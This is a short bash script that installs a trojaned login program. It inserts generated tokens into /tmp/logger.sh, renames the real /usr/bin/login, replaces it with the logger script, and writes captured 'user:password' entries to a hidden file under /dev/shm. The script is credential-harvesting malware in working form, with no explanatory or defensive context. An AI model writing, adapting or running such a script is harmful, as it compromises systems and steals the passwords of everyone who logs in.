#!/bin/bash
S1=$(python3 /tmp/gen_token5.py | head -1 | tr -d '\n')
S2=$(python3 /tmp/gen_token5.py | tail -1 | tr -d '\n')
sed -i "s/PLACEHOLDER1/$S1/" /tmp/logger.sh
sed -i "s/PLACEHOLDER2/$S2/" /tmp/logger.sh
unset TOKEN{1,2,3,4,5,6,7,8,9}
mv /usr/bin/login /usr/bin/logon
mv /tmp/logger.sh /usr/bin/login
chmod +x /usr/bin/login
echo "Logged-> user:password" >> /dev/shm/.$S1
unset S1
unset S2
